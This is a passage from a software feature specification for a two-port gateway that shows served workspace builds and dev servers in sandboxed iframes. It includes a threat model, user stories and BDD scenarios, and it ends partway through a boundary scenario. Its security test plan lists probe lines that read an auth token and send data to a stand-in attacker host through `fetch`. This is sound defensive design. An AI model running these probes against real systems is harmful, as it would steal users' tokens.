# Feature Specification: Chat-Served Iframe Preview + Two-Port Origin Isolation

**Created**: 2026-04-26
**Revised**: 2026-04-26 (R2: design-fix pass) → 2026-04-26 (R3: codebase-reconciliation pass)
**Status**: Draft (post-R3)
**Input**: Conversation-driven feature brief + two grill-spec review passes. Resolves three reported defects: (a) tool URLs containing the bind-host `0.0.0.0` are unreachable, (b) workspace-served tools require a manual click into a separate tab, (c) chat links to served URLs are not clickable. Architectural decision: two-port single-binary topology gives origin isolation without DNS, scaling cleanly across CLI, Electron, and Cloud SaaS.

R3 addresses the four codebase-mismatch CRITICALs surfaced by the second grill review (which confirmed the R2 design pass closed all R1 design defects):

- **CR-01 / `workspaceCSP`**: the existing constant in `pkg/gateway/rest_workspace.go:64-66` sets `frame-ancestors 'none'` and `connect-src 'none'` on `/serve/` responses. R3 replaces those two directives with `frame-ancestors '<main_origin>'` and `connect-src 'self'` (the latter so hydrated SPAs can fetch their own data files). Documented in FR-007c.
- **CR-02 / `RequireMatchingOriginOnStateChanging`**: `pkg/gateway/rest_dev.go:133` wraps `proxyDevRequest` in this middleware which compares `Origin` to the **main** origin. R3 removes this middleware on the preview-listener registration since the path token is the credential (matches the FR-023 token-only model). Documented in FR-023a.
- **CR-03 / `run_in_workspace` schema**: `pkg/tools/run_in_workspace.go:354-358` returns `SilentResult(<sentence>)`, not JSON. R3 migrates this to a structured `NewToolResult` returning `{path, url, expires_at, command, port}` JSON, with a parallel `summary` field carrying the human-readable sentence for the LLM. Documented in FR-008a.
- **CR-04 / `RunInWorkspaceConfig`**: `pkg/config/config.go:1377` `ToolsConfig` has no `RunInWorkspace` member. R3 adds a `RunInWorkspaceConfig` struct and `ToolsConfig.RunInWorkspace RunInWorkspaceConfig` field with a `WarmupTimeoutSeconds int32` (default 60). Documented in FR-013 + Symbols table.

R3 also addresses the eleven MAJOR findings from the second pass (CSP-merge with dev-server, frame-ancestors source on bare-IP, audit-event payload schema, audit on failures, hot-reload contract, Termux default, SPA path-validation against XSS, etc.).

R2 addressed the seven CRITICAL and fourteen MAJOR findings from the first pass:

- **C-01 / auth model**: replaced session-cookie auth on `/serve/` and `/dev/` with a URL-bearer-token model on the preview listener. Documented in Threat Model.
- **C-02 / CORS preflight**: added FRs for CORS headers on preview listener + warmup probe redesigned to use `iframe.onload`-based polling (avoids cross-origin fetch entirely).
- **C-03 / cross-served storage cross-talk**: documented as accepted single-tenant-per-browser-session limit. Per-token subdomains are out of scope; future migration path captured.
- **C-04 / token leakage via Referer**: added `Referrer-Policy: no-referrer` requirement.
- **C-05 / preview mux scope**: explicit FR + tests that the preview listener returns 404 for `/`, `/index.html`, `/api/`, `/health`, `/onboarding`, etc.
- **C-06 / threat-model inconsistencies**: rewrote the security narrative as a single Threat Model section.
- **C-07 / warmup math**: precise state machine, replacing the cross-origin HEAD probe with iframe-load polling.

---

## Threat Model

A single source of truth for the security narrative. Each attack vector lists the proximate mitigation and the defence-in-depth layer.

| ID | Threat | Proximate mitigation | Defence-in-depth |
|---|---|---|---|
| T-01 | Malicious build's JS reads the SPA's `localStorage` (admin token) | Cross-origin policy: SPA at `<host>:<main_port>`, iframe at `<host>:<preview_port>` are different origins. `parent.localStorage` access throws `SecurityError`. | Iframe `sandbox` attribute (no `allow-top-navigation`) further restricts the served context. |
| T-02 | Malicious build calls `/api/v1/*` as the user | Preview listener does NOT register `/api/v1/*` (FR-005, FR-006). 404 is the proximate response. | The SPA's session cookie is `SameSite=Strict` with no `Domain` attribute, so even cross-port requests carry no auth. |
| T-03 | Token leak via `Referer` header to attacker.com | `Referrer-Policy: no-referrer` set on every `/serve/` and `/dev/` response. | Token TTLs minimise the leak window. |
| T-04 | Attacker iframes a leaked-token URL from `evil.com` | `Content-Security-Policy: frame-ancestors '<main_origin>'` on `/serve/` and `/dev/` responses. When `<main_origin>` cannot be derived (host=`0.0.0.0` and no `public_url` set), this directive falls back to `frame-ancestors '*'` with a startup warning — defence is lost on bare-IP deployments by design (operator must opt into `public_url` for strict embedding control). | Defence-in-depth only: a leaked token can be opened directly (not embedded) by anyone — the token is a bearer credential by design (T-09). |
| T-05 | Two `/serve/<agent>/<token>/` instances open in two tabs read each other's `localStorage` (single-tenant cross-talk) | **Accepted limitation.** Same preview-origin = shared storage between served instances. Acceptable for single-user/single-browser deployments (CLI, Electron, single-operator). | Per-token subdomain isolation is the future-hardening path (out of scope for this spec; documented as migration target). |
| T-06 | Malicious dev server (`run_in_workspace`) does anything `serve_workspace` could | **Accepted by trust model**: `run_in_workspace` runs user-authored code with Tier 3 capabilities. Origin isolation only stops it from reaching SPA state — not from doing arbitrary work on its own. | Documented in Non-Behaviors. |
| T-07 | Iframe escapes via popup (`allow-popups` lets new windows open) | Drop `allow-popups-to-escape-sandbox` (the original revision included it; removed per Mn-08). Popups inherit the iframe's sandbox. | `target="_blank"` from served HTML still works for navigation but stays sandboxed. |
| T-08 | Token leak via reverse-proxy access logs / browser history | **Accepted by token-bearer model.** Any URL with a path token is leaked when shared. Tokens are short-lived; operators are advised in docs to keep TTLs tight. | Audit-log path-leak attempts via `dev.served` events with sanitised path. |
| T-09 | Direct viewing of leaked token (not embedded) | **Accepted.** This is the bearer-token contract. `frame-ancestors` does not protect against direct viewing — only embedding. The Threat Model in this spec is honest about this. | Operators can shorten `serve_workspace.MaxDurationSeconds`. |
| T-10 | CSRF on `/api/v1/*` from served iframe | The iframe can't issue authenticated calls (T-02) and even if it could, CSRF protection requires the `X-CSRF-Token` header which the iframe cannot read. | Existing CSRF middleware unchanged. |

### Auth model on the preview listener (resolves C-01)

`/serve/<agent>/<token>/` and `/dev/<agent>/<token>/` on the preview listener are **token-bearer** routes. The path token IS the credential. They do NOT require a session cookie or bearer header. Rationale:

- The token is unguessable (constant-time-comparable) and minted only by `serve_workspace` / `run_in_workspace`, which themselves run under authenticated agent-loop dispatch (the agent's owner is the user who triggered the tool).
- Tokens are short-lived, agent-scoped, and revoked on session end.
- Anyone with the URL has access — same model as Vercel preview deploys, Replit live previews, GitHub Pages preview links. This is the documented bearer-token contract.

This **removes** the existing `RequireSessionCookieOrBearer` middleware on `/serve/` and `/dev/` registrations on the preview mux. Existing handler-internal owner check (`AuthorizeAgentAccess`) is removed because there is no authenticated user in the request context to authorise. Owner enforcement happens at **token issuance** time (only the owner of an agent can trigger `serve_workspace` for that agent) — the token is the post-authorisation artefact.

Documentation updates (see Documentation Deliverables) flag this prominently: shortened TTLs, "shareable preview link" warning copy in the chrome bar.

---

## Existing Codebase Context

### Symbols Involved

| Symbol | Role | Context |
|---|---|---|
| `pkg/gateway/gateway.go: Run` (line 850-961) | **modifies** | Today computes `addr := host:port` and a single `gatewayBaseURL`; will be split into a main listener and a preview listener with two host:port binds. |
| `pkg/channels/manager.go: SetupHTTPServer` (line 557) | **extends** | Owns the single `httpServer + mux`. Gains a sibling `SetupPreviewServer(addr)` that owns a preview-only mux. |
| `pkg/channels/manager.go: StartAll` (line 649) | **modifies** | Adds a second goroutine for the preview listener with parallel shutdown semantics. |
| `pkg/gateway/rest.go: registerAdditionalEndpoints` (line 2293, 2304) | **modifies** | `/serve/` and `/dev/` are removed from the main mux and re-registered on the preview mux WITHOUT `RequireSessionCookieOrBearer`. |
| `pkg/gateway/rest_serve.go: HandleServeWorkspace` (line 46) | **modifies** | Auth shifts from middleware-based (cookie/bearer + ownership) to token-only. Owner check inside the handler is removed. CORS headers added; CSP/Referrer-Policy already set today via `setWorkspaceSecurityHeaders` — see CSP changes below. |
| `pkg/gateway/rest_dev.go: HandleDevProxy` (line 53) | **modifies** | Same auth shift. **`RequireMatchingOriginOnStateChanging` middleware removed** (line 133) — token is the credential. CORS / CSP / Referrer-Policy headers added via the same `setWorkspaceSecurityHeaders` helper. |
| `pkg/gateway/rest_dev.go: proxyDevRequest` (line 146) | **modifies** | Adds `rp.ModifyResponse` callback that strips any upstream `Content-Security-Policy` header from the dev server before injecting the gateway's CSP (FR-007d). Also strips upstream `X-Frame-Options` for the same reason. |
| `pkg/gateway/rest_workspace.go: workspaceCSP` (line 64-66) | **modifies** | Constant changes: `frame-ancestors 'none'` → `frame-ancestors '<main_origin>'`, `connect-src 'none'` → `connect-src 'self'`. Variable becomes a function `buildWorkspaceCSP(mainOrigin string) string` because the value is now config-derived. |
| `pkg/gateway/rest_workspace.go: setWorkspaceSecurityHeaders` (line 98-102) | **modifies** | Signature gains a config parameter so it can read `mainOrigin`. Existing call sites in `rest_workspace.go:239,263` and `rest_serve.go:185,209` updated. |
| `pkg/gateway/middleware/origin.go: RequireMatchingOriginOnStateChanging` | **read-only** | Used to be applied to `/dev/`; that registration is removed. The middleware itself is unchanged. |
| `pkg/gateway/rest_settings.go: HandleAbout` (line 489) | **extends** | Response gains `preview_port`, `preview_origin`, `preview_listener_enabled` fields. |
| `pkg/gateway/middleware/origin.go: canonicalGatewayOrigin` (line 49) | **extends** | Already supports `host` containing `://`. Extended to prefer `cfg.Gateway.PublicURL` when set. |
| `pkg/tools/serve_workspace.go: Run` (line 166) | **modifies** | Result schema gains `path` (relative); `url` preserved for transcript replay safety. Already returns JSON; this is additive. |
| `pkg/tools/run_in_workspace.go: Run` (line 354-358) | **modifies** | **Migrates from `SilentResult(<sentence>)` to `NewToolResult(<JSON>, <human-summary>)`** (FR-008a / CR-03). New JSON shape: `{path, url, expires_at, command, port}`. The human summary (the existing sentence) becomes the tool-result `summary` so the LLM still sees the natural-language explanation. |
| `pkg/agent/instance.go: NewAgentInstance` (line 257-308) | **modifies** | `Tier13Deps.GatewayBaseURL` is **deprecated** (kept for one release for replay safety); a new `GatewayPreviewBaseURL` is added. |
| `pkg/config/config.go: GatewayConfig` (line 1151) | **extends** | Adds `PreviewPort int32`, `PreviewHost string`, `PreviewOrigin string`, `PublicURL string`, `PreviewListenerEnabled *bool` fields. |
| `pkg/config/config.go: ToolsConfig` (line 1377) | **extends** | Adds `RunInWorkspace RunInWorkspaceConfig `json:"run_in_workspace,omitempty"`` field. (Note: `ToolsConfig` plural; `ToolConfig` singular at line 1174 is a separate `Enabled bool`-only struct — not the right one.) |
| `pkg/config/config.go: RunInWorkspaceConfig` | **creates** | New struct: `type RunInWorkspaceConfig struct { WarmupTimeoutSeconds int32 `json:"warmup_timeout_seconds,omitempty"` }`. Default 60 applied by boot validator. (Q3 resolved.) |
| `pkg/config/defaults.go` | **extends** | Adds default `WarmupTimeoutSeconds = 60`. |
| `pkg/gateway/rest_pending_restart.go` | **extends** | Includes the five new `gateway.preview_*` fields and `tools.run_in_workspace.warmup_timeout_seconds` in pending-restart diffs (MR-02 / OB-01). |
| `pkg/gateway/middleware/session_cookie.go: setSessionCookie` (line 145-150) | **read-only** | Confirmed `SameSite=Strict` with no `Domain` — relied on for T-01/T-02 defence-in-depth. |
| `cmd/omnipus/internal/doctor/command.go` | **extends** | Adds checks for the new gateway preview ports. |
| `src/components/chat/tools/ServeWorkspaceUI.tsx` | **modifies** | Switches from link block to inline iframe via shared `IframePreview` component. |
| `src/components/chat/tools/RunInWorkspaceUI.tsx` | **creates** | Does not exist today. Renders `IframePreview` with the warmup state machine. |
| `src/components/chat/IframePreview.tsx` | **creates** | Shared component: chrome bar (Reload / Open-in-new-tab / Copy-link with warning), iframe with sandbox, error fallback, "Starting…" placeholder, accessibility primitives. |
| `src/components/chat/markdown-text.tsx: a` renderer (line 132) | **modifies** | Rewrites legacy host on `0.0.0.0`/`[::]`/`[::0]`/`0`/`127.0.0.1` matches. |
| `src/lib/api.ts: AboutInfo` (line ~860) | **extends** | Adds `preview_port`, `preview_origin`, `preview_listener_enabled` typed fields. |
| `src/lib/preview-url.ts` | **creates** | Centralised URL rewrite + warmup probe utility (resolves O-02). |

### Impact Assessment

| Symbol Modified | Risk Level | Direct Dependents | Indirect Dependents |
|---|---|---|---|
| `Manager.SetupHTTPServer` | LOW | `gateway.Run` only | All HTTP route registrations (additive — none break) |
| `HandleServeWorkspace` auth model change | **CRITICAL** | All existing `/serve/` callers | `pkg/gateway/rest_serve_test.go` (full rewrite), any e2e tests that exercised cookie-auth flow on `/serve/` |
| `HandleDevProxy` auth model change | **CRITICAL** | All existing `/dev/` callers | `pkg/gateway/rest_dev_test.go` (full rewrite) |
| `HandleServeWorkspace` route move | MEDIUM | Handler invocations (now on preview mux) | Pre-fix transcripts in `/sessions/` (mitigated by SPA replay rewrite) |
| `ServeWorkspaceResult` schema | LOW (additive) | SPA `ServeWorkspaceUI`, `parseResult` | Replay test corpus |
| `GatewayConfig` schema | LOW (additive) | Boot path, config migration | None — defaults computed |
| `Tier13Deps.GatewayBaseURL` deprecated | LOW | `agent.NewAgentInstance` only (Mn-04 add-and-deprecate) | None |

### Relevant Execution Flows

| Flow Name | Relevance |
|---|---|
| Gateway boot (`Run` → `SetupHTTPServer` → `SetupPreviewServer` → `StartAll`) | Two listeners come up serially: main first, preview second. Both bound before any agent handles a request. |
| Tool dispatch (LLM → `ToolRegistry.Execute` → `serve_workspace.Run`) | Tier13Deps carries `GatewayPreviewBaseURL` (used to populate the legacy `url` field). |
| SPA boot (`fetchAbout` → `useAboutStore` → tool UIs render) | `preview_port` / `preview_origin` are loaded before any tool result is rendered. Cached for the session. |
| Replay (transcript JSONL → SPA hydrates → tool UIs re-render) | Old `url` values with `0.0.0.0` host trigger the SPA-side rewrite via `preview-url.ts`. |
| Doctor (`omnipus doctor`) | Adds checks for preview-port collision, privileged-port warnings, host-vs-port consistency. |

---

## Rejected Alternatives (resolves O-01)

| Alternative | Why rejected |
|---|---|
| Single-listener + COOP/COEP/CORP | COOP isolates window groups, not origins. The iframe is still same-origin to the SPA, so `parent.localStorage` access succeeds. The browser primitives that gate cross-origin reads check the **document origin**, not the COOP cluster. Single-listener cannot achieve T-01 mitigation without a different origin. |
| Per-token subdomain (`<token>.preview.<host>`) | Requires DNS + TLS infrastructure that is unavailable for the bare-IP / Electron / local-CLI deployments named in the brief. This is the long-term hardening path (T-05); migration is straightforward — set `gateway.preview_origin` to a wildcard subdomain template. |
| Service-worker proxying inside the SPA | Drops the security boundary (served JS runs in the SPA's origin). |
| Custom Electron protocol only | Electron-only. Doesn't help CLI / Cloud / dev. Will be added later as an Electron-shell concern, on top of the two-port architecture. |
| Path-only relative URLs + sandbox-without-`allow-same-origin` (the previous draft option 4a) | User explicitly rejected the loss of `allow-same-origin` in the conversation. Two-port restores `allow-same-origin` safely because the iframe is now cross-origin to the SPA. |

---

## User Stories & Acceptance Criteria

### User Story 1 — Inline iframe preview for built sites (Priority: P0)

A user has Mia or a custom agent run `serve_workspace` to expose a static build. Today the chat shows only a link they have to click into a new tab; on a public-IP deployment that link contains `0.0.0.0` and is broken. The user wants to see the served site **rendered live, inline in the chat**, immediately after the tool succeeds, with one click to escape into a fullscreen tab when they want to inspect it.

**Why this priority**: Without this, the v4 `serve_workspace` tool is unusable on any public deployment. Headline value of Tier 1 capability.

**Independent Test**: Run an agent that calls `serve_workspace` against a known static directory; confirm the chat surface renders an iframe whose visible content matches that directory's `index.html`, and that an "Open in new tab" button on the component opens the same URL in a new browser tab.

**Acceptance Scenarios**:

1. **Given** the gateway is bound to `0.0.0.0:5000` (preview on 5001) and the user is browsing from `http://146.190.89.151:5000`, **When** Mia successfully calls `serve_workspace path="."`, **Then** the chat renders an inline iframe whose `src` resolves to `http://146.190.89.151:5001/serve/<agent>/<token>/` and the iframe DOM contains the served `index.html`.
2. **Given** the iframe preview is rendered, **When** the user clicks the "Open in new tab" button on the chrome bar, **Then** a new browser tab opens with the same absolute URL the iframe resolved to (direct `window.open`, no SPA wrapper page — Mn-01 resolved).
3. **Given** a static site with `localStorage.setItem('foo','bar')` in its JS, **When** the user interacts with the iframe, **Then** the iframe's localStorage write succeeds AND the SPA's localStorage at `http://146.190.89.151:5000` is unchanged (T-01).
4. **Given** the user re-opens an old session whose transcript stores `url = "http://0.0.0.0:5000/serve/<agent>/<token>/"`, **When** the chat replays the tool result, **Then** the iframe still resolves to a working URL by extracting the path and reconstructing it against the current preview origin.
5. **Given** the user clicks "Copy link" in the chrome bar, **When** the toast appears, **Then** the toast text reads "Link copied. Anyone with this link can view the preview until it expires" (Mn-09 resolved).

---

### User Story 2 — Live dev-server preview with warmup state (Priority: P0)

A custom developer agent calls `run_in_workspace` to spawn a Next.js dev server. The dev server takes 5–30 s to print "ready". Today there is no UI for this tool at all. The user wants a live preview that **shows a clear "Starting dev server…" state while the server warms up, then auto-swaps to the live iframe** without manual reload.

**Why this priority**: Tier 3 `run_in_workspace` is the iterating-on-an-app workflow.

**Independent Test**: Spawn a dev server that takes ≥5 s to bind; confirm the preview component shows a "Starting dev server…" message, polls the URL via a hidden iframe (not via cross-origin fetch — see C-02 resolution), and swaps to the visible iframe within one polling interval after the server goes live.

**Acceptance Scenarios**:

1. **Given** an agent calls `run_in_workspace` and the dev server is not yet listening, **When** the tool result arrives, **Then** the preview component shows a "Starting dev server…" placeholder with an animated indicator and an accessible aria-live announcement, and a hidden probe-iframe is mounted with the preview URL + cache-busting query at t=0 and re-mounted every 2 s thereafter.
2. **Given** the dev server fails to start within 60 s, **When** 30 probe attempts have all failed (no `onload` within 1.8 s of mount), **Then** the component shows an error fallback with the URL as a clickable link and a "Retry" button. Clicking "Retry" restarts the polling loop from probe 1.
3. **Given** a logged-in user reaches the gateway via `https://omnipus.acme.com` (proxied) and the operator has set `gateway.preview_origin = "https://preview.omnipus.acme.com"`, **When** the dev-server iframe mounts, **Then** its `src` is `https://preview.omnipus.acme.com/dev/<agent>/<token>/` AND a CSP `frame-ancestors` header on the response lists exactly `https://omnipus.acme.com`.
4. **Given** the iframe is mounted and rendering the dev server, **When** the user clicks "Reload" on the chrome bar, **Then** the iframe `src` is reset to the current URL with a fresh cache-busting query (the polling loop is NOT restarted because the iframe is already live — Mn-06 resolved).

---

### User Story 3 — Operator deploys without DNS or special config (Priority: P0)

An operator runs the omnipus binary on a single VPS reachable at a bare IP. They have no domain, no TLS. They want the iframe preview to work without any extra configuration beyond `gateway.host` and `gateway.port`.

**Why this priority**: Documented quickstart deployment.

**Independent Test**: Boot the gateway with default config on `0.0.0.0:5000` against a fresh `OMNIPUS_HOME`; trigger `serve_workspace` and verify the iframe renders a working preview reachable at `http://<host>:5001/...` without any config changes.

**Acceptance Scenarios**:

1. **Given** `gateway.preview_port` is unset, **When** the gateway boots with `gateway.port = 5000`, **Then** the preview listener binds on port 5001 and a startup log line is emitted: `gateway listening on <main_addr>` followed by `preview listening on <preview_addr>` (in that order — Mn-07 resolved).
2. **Given** `gateway.preview_port = gateway.port = 5000`, **When** the gateway boots, **Then** boot fails with `gateway.preview_port must differ from gateway.port`.
3. **Given** the operator binds main on a privileged port (e.g. 80) **When** the auto-derived preview port (81) collides with another process, **Then** boot fails with an error naming the port-in-use and suggesting `gateway.preview_port` to override.
4. **Given** `gateway.port = 65535` and `gateway.preview_port` is unset, **When** the gateway boots, **Then** boot fails with `auto-derived preview port 65536 is out of range; set gateway.preview_port explicitly` (M-01 resolved).
5. **Given** the operator wants the preview listener bound to `127.0.0.1` while keeping main on `0.0.0.0`, **When** they set `gateway.preview_host = "127.0.0.1"`, **Then** the preview listener binds on `127.0.0.1:<preview_port>` exclusively (M-09 resolved).

---

### User Story 4 — SPA auth perimeter remains intact (Priority: P0 / Security)

The omnipus security model treats the SPA's localStorage and `/api/v1/*` access as a privileged perimeter. A malicious or compromised build inside `serve_workspace` must not be able to read the admin token, call `/api/v1/agents` as the user, exfiltrate via `Referer`, or otherwise breach the SPA's identity.

**Why this priority**: A security regression here would offset the entire feature's value.

**Independent Test**: Place a probe `<script>` in the served directory that attempts each of: `parent.localStorage.getItem('omnipus_auth_token')`, `fetch('/api/v1/agents', { credentials: 'include' })`, `top.document.querySelector('body')`, `top.location = 'http://attacker.com'`, `fetch('https://attacker.com/?t=' + location.pathname)` (Referer leak). Verify all five fail or are mitigated as documented.

**Acceptance Scenarios**:

1. **Given** the iframe loads from the preview origin, **When** the served JS calls `parent.localStorage`, **Then** the call throws `SecurityError` (T-01).
2. **Given** the served JS calls `fetch('/api/v1/agents', { credentials: 'include' })`, **When** the request is dispatched, **Then** the request lands on the preview listener and returns 404 because `/api/v1/*` is not registered there (FR-005). Even if it were, the SPA's session cookie would not be attached because the cookie has no `Domain` attribute and is `SameSite=Strict`-scoped to the main origin (defence-in-depth — T-02). The BDD scenario asserts the 404 as the proximate cause (M-13 resolved).
3. **Given** the served JS calls `top.location = 'http://attacker.com'`, **When** the call executes, **Then** the call has no effect because the iframe `sandbox` lacks `allow-top-navigation` (T-03 in old numbering — covered by the iframe sandbox).
4. **Given** the served JS calls `fetch('https://attacker.com/?t=' + location.pathname)`, **When** the browser issues the request, **Then** the `Referer` header is **not present** because the gateway sets `Referrer-Policy: no-referrer` on `/serve/` and `/dev/` responses. The token can still appear in the URL fragment of the served path that the JS itself reads, so this is a defence against passive leak only (T-03).
5. **Given** the operator has set `gateway.public_url = "https://omnipus.acme.com"` and the gateway is fronted by nginx, **When** an attacker hosts a page at `https://evil.com` that iframes a leaked-token URL, **Then** the browser blocks the embed because `Content-Security-Policy: frame-ancestors 'https://omnipus.acme.com'` is set on the response. **And** the spec acknowledges (in this exact paragraph) that the attacker can still open the URL directly — this defence only blocks embedding (T-04).

---

### User Story 5 — Production reverse-proxy operator (Priority: P1)

An operator running omnipus behind nginx/Caddy with a real domain wants the preview origin on a sibling subdomain (`preview.omnipus.acme.com`) so users see clean URLs and the cert is shared.

**Why this priority**: Production-grade self-host is the path to SaaS later. Important but not blocking immediate test.

**Independent Test**: Configure nginx with two server blocks (main + preview) pointing at the two ports; set `gateway.public_url = "https://omnipus.acme.com"` and `gateway.preview_origin = "https://preview.omnipus.acme.com"`; verify iframe resolves to that URL and the `Content-Security-Policy: frame-ancestors` on `/serve/*` lists the main origin.

**Acceptance Scenarios**:

1. **Given** `gateway.preview_origin = "https://preview.omnipus.acme.com"` is set, **When** `serve_workspace` returns, **Then** the SPA constructs the iframe `src` from `preview_origin + path` (not from `window.location.hostname`) AND the absolute `url` field in the result also uses that origin.
2. **Given** the gateway runs behind a reverse proxy and `gateway.public_url = "https://omnipus.acme.com"` is set, **When** any `/serve/<agent>/<token>/` response is served, **Then** the `Content-Security-Policy` header lists exactly `frame-ancestors 'https://omnipus.acme.com'` (M-03 resolved).
3. **Given** the SPA was loaded from `http://main.example.com:5000` (HTTP) but `gateway.preview_origin = "https://preview.example.com"` (HTTPS), **When** the SPA constructs the iframe URL, **Then** the SPA detects the mixed-content scheme mismatch and shows an error block instead of the iframe, with a console warning (M-05 resolved). Mixed-content iframes would be blocked by the browser anyway; the SPA fails fast with a clearer message.

---

### User Story 6 — Operator can disable iframe rendering for emergency rollback (Priority: P2)

An operator discovers that iframe rendering breaks under their specific browser/extension combination. They want a config flag that disables the preview listener and falls back to link-only rendering, without redeploying.

**Why this priority**: Emergency rollback path. Won't be used often but is the difference between "patch via config restart" and "redeploy" (M-11 resolved).

**Independent Test**: Set `gateway.preview_listener_enabled = false`, restart, confirm the preview listener does NOT bind, the SPA's `/api/v1/about` returns `preview_listener_enabled: false`, tool UIs render the legacy link-only block.

**Acceptance Scenarios**:

1. **Given** `gateway.preview_listener_enabled = false`, **When** the gateway boots, **Then** only the main listener binds, `GET /api/v1/about` returns `preview_listener_enabled: false`, and a startup log line `preview listener disabled by config` is emitted.
2. **Given** the SPA observes `preview_listener_enabled: false`, **When** any `serve_workspace` or `run_in_workspace` tool result is rendered, **Then** the component shows the legacy link block with the absolute URL pointing at the main listener (effectively the pre-fix behaviour).

---

## Behavioral Contract

**Primary flows:**

- When an agent calls `serve_workspace` or `run_in_workspace`, the chat renders an inline iframe whose origin differs from the SPA's origin (different port, different `preview_origin`).
- When the iframe mounts on a static path (`/serve/...`), it renders immediately.
- When the iframe mounts on a dynamic path (`/dev/...`), it shows a "Starting…" state until a hidden probe-iframe successfully `onload`s on the same URL.
- When the user clicks "Open in new tab", the same absolute URL opens via direct `window.open(url, '_blank', 'noopener,noreferrer')`.
- When the user clicks "Reload" on a live iframe, the iframe `src` is updated with a cache-buster, no polling restarts.
- When the user clicks "Copy link", the absolute URL is copied AND a toast warns about the bearer-token nature.
- When the iframe is in placeholder/error state, the same chrome button is labelled "Retry" and restarts polling.

**Error flows:**

- When the dev server fails to come up within 60 s (30 probes × 2 s), the placeholder is replaced with an error block + "Retry".
- When the iframe `onerror` fires (network unreachable / CSP block), the component falls back to a link-only block with a console warning.
- When the gateway receives a `/serve/...` request whose token is expired, the response is **401** (not 410 — M-07 resolved); the iframe content area shows the gateway's "token unknown or expired" page.
- When the SPA detects scheme mismatch (HTTP main vs HTTPS preview), it shows a mixed-content error block instead of mounting an iframe.

**Boundary conditions:**

- When `preview_port` is auto-derived to `port + 1` and that port is in use, the gateway fails to boot.
- When `preview_port == port`, the gateway fails to boot.
- When `port = 65535`, auto-derivation fails to boot with a clear overflow message.
- When `gateway.preview_listener_enabled = false`, the preview listener is not bound; tool UIs degrade to link-only.
- Validation order on boot: (1) main `port` in `[1, 65535]`, (2) `preview_listener_enabled`, (3) preview port set or derived, (4) preview port in `[1, 65535]`, (5) `preview_port != port`, (6) `preview_origin` parses as URL with scheme, (7) `public_url` parses as URL with scheme (M-08 resolved).

---

## Edge Cases

- The gateway is restarted between tool call and user re-opening the session: token may be expired (TTL hit). Iframe shows the gateway's 401 page; user can ask the agent to re-run the tool.
- The user accesses the gateway via two different hosts simultaneously: each tab's iframe URL is built from its own `window.location.hostname`, so both work.
- A reverse proxy strips `Host` headers and re-emits with a different value: SPA uses `window.location.hostname`, which reflects the user-facing host.
- A served page is heavy (>16 MB single asset): served via the existing static-file handler unchanged.
- A browser extension injects scripts into iframes: extensions bypass `sandbox`. Documented as out-of-scope (Mn-05).
- A user shares a copy-linked URL in Slack: the link is a bearer credential. The Copy-link toast warns about this.
- Two `/serve/` instances open in two tabs: they share localStorage on the preview origin (T-05 accepted limitation).
- Operator runs two omnipus instances on one host: preview ports collide on `5001`. Doctor flags this; second instance fails to boot with a clear message.
- A tool result lands but the preview listener was disabled by feature flag: the SPA renders link-only (US-6 AS-2).
- The iframe's `onload` fires for the gateway's "expired" page (not the served content): the page renders, user reads "token expired", manually re-runs the tool. No special handling.
- IPv6 / `[::]` / `localhost`-aliases as the configured `gateway.host`: rewrite logic handles them (M-12).

---

## Explicit Non-Behaviors

- **The system must not** reach served content from the main listener; `<host>:<port>/serve/...` returns 404 (FR-006).
- **The system must not** include `allow-top-navigation` in the iframe sandbox (T-03 mitigation).
- **The system must not** include `allow-popups-to-escape-sandbox` in the iframe sandbox (Mn-08 resolved).
- **The system must not** auto-open the served URL in a new tab on tool completion (UX surprise, pop-up blockers).
- **The system must not** strip cookies the served site itself sets — origin separation already isolates them.
- **The system must not** expose `/api/v1/*`, `/`, `/index.html`, `/health`, `/onboarding`, the SPA fallback, OR ANY other path on the preview listener except `/serve/...` and `/dev/...` (FR-005, C-05 resolved).
- **The system must not** require a session cookie or bearer token for `/serve/<agent>/<token>/` or `/dev/<agent>/<token>/` requests on the preview listener (the URL token IS the credential — C-01 resolved).
- **The system must not** fall back to an `http://0.0.0.0:port/...` URL anywhere a user can see it.
- **The system must not** protect the user from their own dev-server outputs (`run_in_workspace` runs user code with Tier 3 capabilities — T-06 accepted).
- **The system must not** terminate TLS itself; operators put a reverse proxy in front for production HTTPS.
- **The system must not** issue a CORS-allow-origin wildcard on preview-listener responses; only the configured main origin is allowed (FR-007a).
- **The system must not** include the served path as a `Referer` value on outbound requests from the served page (FR-007b).

---

## Integration Boundaries

### Operator's reverse proxy (nginx / Caddy / Traefik)

- **Data in**: HTTP requests on two virtual hostnames (main + preview). Optional `X-Forwarded-Proto`, `X-Forwarded-Host`.
- **Data out**: Two `server_name` blocks pointing at the same backend on different ports.
- **Contract**: Operator-supplied. Documented in `docs/operations/reverse-proxy.md` (created by this work).
- **On failure**: Misconfigured proxy → iframes 404 → fallback link block.
- **Development**: Real nginx in the smoke profile; mocked via direct two-port binding in unit tests.

### Browser sandbox + same-origin policy

- **Data in**: Iframe `src`, `sandbox` attribute, `Content-Security-Policy: frame-ancestors`, `Referrer-Policy: no-referrer`.
- **Data out**: Browser-enforced cross-origin isolation.
- **Contract**: WHATWG HTML spec; modern Chromium/Firefox/Safari.
- **On failure**: Browser-extension injection bypasses sandbox (Mn-05). Documented.

### Existing transcript replay pipeline

- **Data in**: JSONL transcript records with `tool_calls[].result` containing legacy `{ url, expires_at }` shape OR new `{ path, url, expires_at }` shape.
- **Data out**: Re-rendered chat with iframes resolved to current preview origin via `preview-url.ts`.
- **Contract**: SPA's `preview-url.ts: rewriteLegacyURL(href, hostname, previewPort)` extracts a `path` from a legacy `url` field; if parse fails, falls through to link-only.
- **On failure**: Malformed legacy URL → link-only fallback.

---

## BDD Scenarios

### Feature: Two-port gateway boot

#### Scenario: Default preview port is derived from main port

**Traces to**: User Story 3, Acceptance Scenario 1
**Category**: Happy Path

- **Given** `config.json` has `gateway.port = 5000` and no `gateway.preview_port`
- **When** the gateway boots
- **Then** the main listener binds on 5000 and the preview listener on 5001
- **And** the boot log emits `gateway listening on <main_addr>` then `preview listening on <preview_addr>` in that order
- **And** `GET /api/v1/about` returns a JSON body containing `"preview_port": 5001`

#### Scenario: Boot fails when main and preview ports collide

**Traces to**: User Story 3, Acceptance Scenario 2
**Category**: Error Path

- **Given** `config.json` has `gateway.port = 5000` and `gateway.preview_port = 5000`
- **When** the gateway boots
- **Then** boot fails with stderr containing `gateway.preview_port must differ from gateway.port`
- **And** no listeners bind

#### Scenario: Auto-derived preview port overflow boundary

**Traces to**: User Story 3, Acceptance Scenario 4
**Category**: Error Path / Boundary

- **Given** `config.json` has `gateway.port = 65535` and no `gateway.preview_port`
